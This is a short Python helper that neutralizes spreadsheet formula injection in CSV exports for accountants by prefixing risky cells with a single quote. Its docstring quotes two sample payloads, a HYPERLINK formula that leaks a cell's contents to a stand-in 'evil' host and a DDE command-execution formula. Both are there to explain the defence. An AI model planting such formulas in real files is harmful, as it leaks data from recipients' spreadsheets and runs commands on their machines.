"""CSV / spreadsheet formula-injection neutralizer.

Excel and LibreOffice evaluate a cell as a formula when its text starts
with one of  =  +  -  @  (or a leading tab / carriage-return). A malicious
free-text value — a supplier name from OCR, an owner note, a staff name —
like ``=HYPERLINK("http://evil/?"&A1,"ok")`` or ``=cmd|'/c calc'!A1`` would
then execute in the *recipient's* spreadsheet. Our CSV exports are built
specifically for the revisor to open, so the accountant is the victim.

Prefixing a single quote forces the cell to render as literal text; it's
the standard, lossless OWASP mitigation. Apply ONLY to free-text columns —
never to numeric columns, where a legitimate negative value ("-50.00")
must keep its leading minus.
"""
from __future__ import annotations

_DANGEROUS_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value):
    """Neutralize a single cell. Strings that would be parsed as a
    formula get a leading single quote; everything else is returned
    unchanged."""
    if isinstance(value, str) and value and value[0] in _DANGEROUS_PREFIXES:
        return "'" + value
    return value
